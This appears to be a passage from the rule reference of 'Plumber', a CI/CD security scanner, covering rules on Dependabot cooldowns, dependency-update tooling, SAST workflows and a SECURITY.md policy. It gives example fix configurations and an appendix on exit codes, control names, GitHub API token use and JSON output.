## ISSUE-902 — `dependabot-missing-cooldown`

**Severity:** `low` • **Control:** `dependabotEcosystemsMustHaveCooldown`

An ecosystem in `.github/dependabot.yml` has no `cooldown:` window.
Dependabot then opens a PR the instant a new upstream version is
published — including the minute-old release a compromised maintainer
just pushed. The security-advisory pipeline needs 24–72 h to flag a
bad release; a cooldown buys that window.

```yaml
# ❌ before
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule: { interval: daily }
```

```yaml
# ✅ after — 3-day default, 7-day window for major bumps
version: 2
updates:
  - package-ecosystem: npm
    directory: /
    schedule: { interval: daily }
    cooldown:
      default-days: 3
      semver-major-days: 7
      include: ["*"]
```

---

## ISSUE-903 — `dependency-update-tool-missing`

**Severity:** `medium` • **Control:** `repositoriesMustConfigureDependencyUpdates`

The repository ships CI/CD workflows but has neither
`.github/dependabot.yml` nor a Renovate config. Dependency pins —
third-party action SHAs, container image digests, lockfiles — then
drift as upstream patches land; every unpatched CVE stays until a
human remembers to refresh them.

Fix for Dependabot (`.github/dependabot.yml`):

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }
    cooldown: { default-days: 3, semver-major-days: 7 }
  - package-ecosystem: npm            # or pip / gomod / cargo / …
    directory: /
    schedule: { interval: weekly }
```

Alternative: a minimal `renovate.json` at the repo root:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended"],
  "pinDigests": true
}
```

Either one satisfies the rule.

---

## ISSUE-904 — `sast-workflow-missing`

**Severity:** `low` • **Control:** `repositoriesMustRunSAST`

None of the repository's workflows invokes a recognised SAST
scanner (CodeQL, Semgrep, SonarQube, Trivy config scan, Snyk,
FOSSA, Bearer, DevSkim, gitleaks, …). Static analysis catches
whole vulnerability classes — injection, unsafe deserialisation,
crypto misuse — before they reach production; leaving it out of
CI means the only gate is manual review, which misses regressions
exactly when the diff is large.

Drop a CodeQL workflow (free for public repos) under
`.github/workflows/codeql.yml`:

```yaml
name: CodeQL
on:
  push: { branches: [main] }
  pull_request: { branches: [main] }

permissions:
  contents: read
  security-events: write

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with: { languages: go }     # or javascript / python / …
      - uses: github/codeql-action/analyze@v3
```

Semgrep, SonarCloud, Trivy config-scan, Snyk, Bearer all qualify.
The list is kept broad so the rule does not force a specific
vendor.

---

## ISSUE-905 — `security-policy-missing`

**Severity:** `low` • **Control:** `repositoriesMustPublishSecurityPolicy`

The repository has no `SECURITY.md` (nor `.github/SECURITY.md`,
nor `docs/SECURITY.md`) documenting the vulnerability disclosure
process. Researchers who find an issue have no public contact
beyond opening a GitHub issue — which defeats coordinated
disclosure and trains them to dump vulnerabilities in the open.

A two-paragraph `SECURITY.md` at the root is enough:

```markdown
# Security Policy

## Supported versions

The latest minor release and the previous one receive security
patches. Older releases do not.

## Reporting a vulnerability

Send a private report via GitHub's **Security → Report a
vulnerability** flow, or email security@example.com. We
acknowledge within 48 hours and aim for a fix (or a coordinated
disclosure plan) within 14 days.
```

GitHub picks up any of the three canonical locations and links
the policy from the repo landing page and the "Security" tab.

---

## Appendix

### Exit codes

| Code | Meaning |
| :--- | :--- |
| `0` | The Plumber Score meets the gate (`--min-points` / `--min-score`) |
| `1` | The Plumber Score is below the gate |
| `2` | Invalid usage, configuration, or a runtime / provider / auth / network failure |
| `3` | A check could not be verified and `--fail-warnings` is set (e.g. an action version that could not be resolved), or the run was degraded, and a blocking platform gate (exit 1) outranks it |

### `.plumber.yaml` control names

Each rule's `ControlName` (used with `--controls` / `--skip-controls`
and in `.plumber.yaml`) is declared in
[`control/codes.go`](../control/codes.go). A few shortcuts:

| Code | ControlName |
| :--- | :--- |
| ISSUE-102 / 103 | `containerImageMustNotUseForbiddenTags` |
| ISSUE-701 | `actionsMustBePinnedByCommitSha` |
| ISSUE-713 | `githubActionMustComeFromAuthorizedSources` _(`minimumStars` requires the GitHub API)_ |
| ISSUE-705 | `untrustedTriggersMustNotWriteCache` |
| ISSUE-706 | `dockerfilesMustPinBaseImageByDigest` |
| ISSUE-712 | `releaseWorkflowsMustSignArtefacts` |
| ISSUE-402 | `externalRefsMustNotCollide` |
| ISSUE-703 | `actionsMustNotCarryKnownCVEs` |
| ISSUE-711 | `actionsMustNotDuplicateRunnerBuiltins` |
| ISSUE-714 / 715 / 716 | `actionsMustNotExecuteMutableRemoteCode` |
| ISSUE-213 | `workflowMustNotExportEntireGitHubContext` |
| ISSUE-214 | `workflowMustPinPackageInstalls` |
| ISSUE-215 | `workflowMustNotInjectVarsInScripts` |
| ISSUE-308 | `workflowMustNotIndexSecretsDynamically` |
| ISSUE-309 | `workflowMustNotExportEntireSecretsContext` |
| ISSUE-802 / 415 | `workflowMustNotUseDangerousTriggers`, `pullRequestTargetMustNotCheckoutHead` |
| ISSUE-902 | `dependabotEcosystemsMustHaveCooldown` |
| ISSUE-903 | `repositoriesMustConfigureDependencyUpdates` |
| ISSUE-904 | `repositoriesMustRunSAST` |
| ISSUE-905 | `repositoriesMustPublishSecurityPolicy` |

### API-backed rules

ISSUE-702 / 703 / 707 / 708 / 709 / 711 / 713 and the ISSUE-714/715/716
family call the GitHub REST API **in process** via
`github.com/cli/go-gh`, which reuses the locally stored `gh` token.
Plumber never shells out to the `gh` binary (or any other external
binary) during analysis — see getplumber/plumber#310. Without
`gh auth login`, those rules degrade silently (no false positives)
rather than failing the run.

Token resolution order: `GH_TOKEN` → `GITHUB_TOKEN` →
`GH_ENTERPRISE_TOKEN` → the `gh` CLI's per-host token.

If the action lives in an org behind an IP allow list (which blocks the
runner's `GITHUB_TOKEN`), set `PLUMBER_METADATA_TOKEN` to a token with
public-repository read so version resolution still works. Without it
Plumber falls back to an anonymous read, and if that is rate-limited too
it skips the check rather than guessing.

Disable them explicitly in sealed CI environments with:

```bash
export PLUMBER_DISABLE_GITHUB_API=1
```

### JSON output schema

```bash
plumber analyze --print=false --output findings.json
```

```json
{
  "projectPath": "owner/repo",
  "ciValid": true,
  "findings": [
    {
      "code": "ISSUE-802",
      "severity": "critical",
      "message": "job \"preview\" is reachable via the dangerous trigger \"pull_request_target\"",
      "job": "pr-preview/preview",
      "file": ".github/workflows/pr-preview.yml",
      "line": 13
    }
  ]
}
```
